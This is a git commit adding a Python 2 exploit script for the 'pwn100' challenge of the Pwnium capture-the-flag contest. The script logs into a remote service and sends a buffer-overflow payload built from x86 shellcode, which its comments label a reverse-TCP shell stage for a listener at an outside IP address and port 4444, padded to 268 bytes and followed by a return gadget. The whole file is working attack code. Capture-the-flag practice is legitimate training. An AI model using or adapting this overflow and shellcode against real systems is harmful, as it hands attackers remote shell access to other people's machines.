76a7c28d401e9772c010f8152b5b2477815552fc
Leo.C <evilleoc@gmail.com>
2014-07-07 09:41:23 +0800

    pwnium

---
+++ Pwnium/pwn100/pwn100.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python2
+#-*- coding:utf-8 -*-
+from zio import *
+
+ip = '10.211.55.48'
+ip = '10.10.10.133'
+port = 8282
+
+io = zio((ip, port), timeout=1000, print_write=COLORED(REPR))
+io.read_until('login as: ')
+io.writeline('user')
+io.read_until('password: ')
+io.writeline('user')
+io.read_until('user@user$ ')
+
+# linux/x86/shell/reverse_tcp - 36 bytes (stage 2)
+# VERBOSE=false, LHOST=182.92.158.177, LPORT=4444
+buf =  ""
+buf += "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
+buf += "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+buf += "\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
+shellcode = buf
+
+gadget = 0x08048D9F
+payload = shellcode.ljust(268, 'A') + l32(gadget)
+
+io.writeline(payload)
